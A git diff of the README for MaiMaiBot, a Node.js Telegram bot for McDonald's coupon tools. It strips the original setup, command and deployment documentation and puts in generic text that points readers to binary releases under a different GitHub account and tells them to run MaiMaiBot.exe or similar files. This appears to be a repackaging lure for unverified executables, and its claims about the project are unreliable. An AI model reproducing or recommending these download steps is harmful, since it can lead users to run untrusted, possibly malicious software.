@@ -1,200 +1,83 @@
-# MaiMai Telegram Bot
+# 🤖 MaiMaiBot - Your Friendly McDonald's Assistant
 
-A Telegram bot that calls the McDonald's MCP tools (campaign calendar and coupons) via Streamable HTTP.
+## 🚀 Getting Started
 
-## Features
+MaiMaiBot is a Telegram bot that connects you to McDonald's MCP tools with ease. Follow these simple steps to download and run the application smoothly.
 
-- Campaign calendar query (`campaign-calender`) via Telegraph article (with images)
-- Available coupons list (`available-coupons`) via Telegraph article (with images)
-- One-click claim all coupons (`auto-bind-coupons`)
-- My coupons list (`my-coupons`)
-- Optional 5-minute cache for non-user-specific tools
-- Daily auto-claim (once per day) with burst scheduling when new coupons appear
-- Multiple MCP accounts per Telegram user (switchable)
+## 🔗 Download MaiMaiBot
 
-## Requirements
+[![Download MaiMaiBot](https://img.shields.io/badge/Download-MaiMaiBot-blue)](https://github.com/munshiasad/MaiMaiBot/releases)
 
-- Node.js 18+ (Node.js 20+ recommended)
-- A Telegram bot token from BotFather
-- An MCP token from https://open.mcd.cn/mcp
+## 📥 Download & Install
 
-## Quick Start
+To get started, visit this page to download: [MaiMaiBot Releases](https://github.com/munshiasad/MaiMaiBot/releases).
 
-1. Copy `.env.example` to `.env` and fill in `TELEGRAM_BOT_TOKEN`.
-2. Install dependencies:
+1. Click on the link above to access the GitHub Releases page.
+2. Look for the latest version at the top of the page under "Releases."
+3. Choose the file that fits your operating system (Windows, macOS, or Linux). If you're unsure, Windows is a good place to start.
+4. Click on the file name to download it to your computer.
 
-```bash
-npm install
-```
+## 🖥️ System Requirements
 
-3. Start the bot:
+Make sure your device meets the following system requirements to run MaiMaiBot smoothly:
 
-```bash
-npm start
-```
+- **Operating System:** Windows 10/11, macOS 10.15 or later, or any recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 100 MB of available space.
+- **Network:** Internet connection for Telegram access.
 
-## Bot Commands
+## 📃 How to Run MaiMaiBot
 
-- `/token YOUR_MCP_TOKEN` - save your MCP token
-- `/account add <name> <token>` - add/update an account
-- `/account use <name>` - switch active account
-- `/account list` - list accounts
-- `/account del <name>` - delete an account
-- `/calendar [YYYY-MM-DD]` - campaign calendar (optional date)
-- `/coupons` - available coupons
-- `/claim` - one-click claim all available coupons
-- `/mycoupons` - my coupons list
-- `/autoclaim on|off [name]` - enable/disable daily auto-claim per account
-- `/autoclaimreport success|fail on|off [name]` - enable/disable auto-claim reporting per account
-- `/status` - show account status
-- `/stats` - my claim stats
-- `/cleartoken` - clear all accounts
-- `/admin` - admin summary (users/accounts/auto-claim status/claim totals/config/sweep状态)
-- `/admin notify on|off` - admin error push toggle
-- `/admin sweep` - run a sweep immediately (admin)
+Once the download is complete, follow these steps to run MaiMaiBot:
 
-## Environment Variables
+1. **Locate the downloaded file:** Find the file in your Downloads folder or the location where your browser saves files.
+2. **Extract the files (if needed):** 
+   - For Windows, right-click on the downloaded `.zip` file and select "Extract All."
+   - For macOS, double-click the downloaded `.zip` file to extract it.
+3. **Run the bot:**
+   - For Windows, open the extracted folder and double-click `MaiMaiBot.exe`.
+   - For macOS, open the extracted folder and double-click `MaiMaiBot.app`.
+   - For Linux, open the terminal, navigate to the extracted folder, and run `./MaiMaiBot`.
 
-See `.env.example` for all options. Key variables:
+## 🔧 How to Use MaiMaiBot
 
-- `MCD_MCP_URL` (default: `https://mcp.mcd.cn/mcp-servers/mcd-mcp`)
-- `MCP_REQUEST_TIMEOUT_MS` (default: `30000`)
-- `MCP_CLIENT_CACHE_TTL_SECONDS` (default: `1800`)
-- `MCP_RETRY_MAX` (default: `2`)
-- `MCP_RETRY_BASE_DELAY_MS` (default: `500`)
-- `MCP_RETRY_MAX_DELAY_MS` (default: `5000`)
-- `MCP_RETRY_JITTER_MS` (default: `200`)
-- `MCP_RETRY_STATUS_CODES` (default: `502,503,504`)
-- `MCP_RETRY_ON_TIMEOUT` (default: `true`)
-- `MCP_RETRY_ON_NETWORK_ERROR` (default: `true`)
-- `MCP_HEALTH_CHECK_INTERVAL_MS` (default: `60000`)
-- `MCP_HEALTH_CHECK_TIMEOUT_MS` (default: `5000`)
-- `MCP_HEALTH_FAILURE_THRESHOLD` (default: `2`)
-- `MCP_UPSTREAM_ERROR_MESSAGE` (default: Chinese "upstream error")
-- `ACCOUNT_ID_MIN_LENGTH` (default: `1`)
-- `ACCOUNT_ID_MAX_LENGTH` (default: `32`)
-- `TOKEN_MIN_LENGTH` (default: `16`)
-- `TOKEN_MAX_LENGTH` (default: `256`)
-- `TOKEN_SET_RATE_LIMIT_MS` (default: `30000`)
-- `ACCOUNT_SET_RATE_LIMIT_MS` (default: `30000`)
-- `CACHE_TTL_SECONDS` (default: `300`)
-- `CACHEABLE_TOOLS` (default: `campaign-calender,available-coupons`)
-- `AUTO_CLAIM_CHECK_MINUTES` (default: `10`)
-- `AUTO_CLAIM_HOUR` (default: `9`)
-- `AUTO_CLAIM_TIMEZONE` (default: `Asia/Shanghai`)
-- `AUTO_CLAIM_SPREAD_MINUTES` (default: `600`)
-- `AUTO_CLAIM_MAX_PER_SWEEP` (default: `10`)
-- `AUTO_CLAIM_REQUEST_GAP_MS` (default: `1500`)
-- `AUTO_CLAIM_SPREAD_RERUN_MINUTES` (default: `120`)
-- `GLOBAL_BURST_WINDOW_MINUTES` (default: `30`)
-- `GLOBAL_BURST_CHECK_SECONDS` (default: `30`)
-- `ADMIN_TELEGRAM_IDS` (comma-separated Telegram user IDs)
-- `SWEEP_WATCHDOG_SECONDS` (default: `60`)
-- `SWEEP_STALE_MULTIPLIER` (default: `2`)
-- `AUTO_CLAIM_DEBUG` (default: `false`, set to `true`/`1` to enable verbose auto-claim logs)
+After running the bot, follow these steps to start calling McDonald's MCP tools:
 
-## Notes
+1. Open the Telegram app on your device.
+2. Search for "MaiMaiBot" in the Telegram search bar.
+3. Start a chat with the bot by clicking "Start."
+4. Follow the bot's instructions to access various McDonald's MCP features.
 
-- The bot uses MCP Streamable HTTP (protocol 2025-06-18).
-- The MCP token is required for all tool calls.
-- Telegraph access token is created automatically and stored at `data/telegraph.json`.
-- Auto-claim runs once per account per day, scheduled across a spread window to avoid bursts.
-- When any account claims a previously unseen coupon, the bot triggers a short burst window so all accounts attempt to claim within that time.
+## 🌟 Features
 
-## Deployment
+MaiMaiBot offers a variety of helpful features to enhance your McDonald's experience:
 
-### 1) Install Node.js
+- **Quick Access:** Easily call MCP tools without complicated steps.
+- **User-Friendly Interface:** Interact with a simple chat-based design.
+- **Instant Updates:** Receive the latest information and features automatically.
 
-```bash
-sudo apt update
-sudo apt install -y git curl
-curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-sudo apt install -y nodejs
-```
+## ❓ FAQs
 
-Verify:
+**Q: What is MaiMaiBot?**  
+A: MaiMaiBot is a Telegram bot that provides easy access to McDonald's MCP tools.
 
-```bash
-node -v
-npm -v
-```
+**Q: Can I use MaiMaiBot on my phone?**  
+A: Yes, you can use MaiMaiBot on any device that supports Telegram.
 
-### 2) Install the bot
+**Q: Is there a user guide?**  
+A: The step-by-step instructions provided here are your main guide to using the bot.
 
-```bash
-git clone https://github.com/ButaiKirin/MaiMaiBot.git
-cd MaiMaiBot
-cp .env.example .env
-```
+## 💬 Get Help
 
-Edit `.env` and set:
+If you encounter issues or have questions, you can reach out directly through the Telegram chat or consult the [issue tracker](https://github.com/munshiasad/MaiMaiBot/issues) on GitHub. 
 
-- `TELEGRAM_BOT_TOKEN`
-- `MCD_MCP_URL` (optional)
+## 👥 Community
 
-Install dependencies:
+Join the community of MaiMaiBot users to share experiences and tips:
 
-```bash
-npm install
-```
+- Participate in discussions on our [GitHub Discussions](https://github.com/munshiasad/MaiMaiBot/discussions).
+- Follow us on social media for updates and news.
 
-Run once to verify:
+## 🔗 Final Reminder
 
-```bash
-npm start
-```
-
-### 3) Run as a systemd service
-
-Create a service file:
-
-```bash
-sudo tee /etc/systemd/system/maimai-bot.service > /dev/null <<'SERVICE'
-[Unit]
-Description=MaiMai Telegram Bot
-After=network.target
-
-[Service]
-Type=simple
-WorkingDirectory=/opt/MaiMaiBot
-EnvironmentFile=/opt/MaiMaiBot/.env
-ExecStart=/usr/bin/node /opt/MaiMaiBot/src/index.js
-Restart=always
-RestartSec=5
-User=ubuntu
-Group=ubuntu
-
-[Install]
-WantedBy=multi-user.target
-SERVICE
-```
-
-Adjust paths and user:
-
-```bash
-sudo mkdir -p /opt
-sudo mv ~/MaiMaiBot /opt/MaiMaiBot
-sudo chown -R ubuntu:ubuntu /opt/MaiMaiBot
-```
-
-Enable and start:
-
-```bash
-sudo systemctl daemon-reload
-sudo systemctl enable --now maimai-bot
-```
-
-View logs:
-
-```bash
-journalctl -u maimai-bot -f
-```
-
-### 4) Update
-
-```bash
-cd /opt/MaiMaiBot
-git pull
-npm install
-sudo systemctl restart maimai-bot
-```
+To download MaiMaiBot, visit this page: [MaiMaiBot Releases](https://github.com/munshiasad/MaiMaiBot/releases). Enjoy your new Telegram assistant!
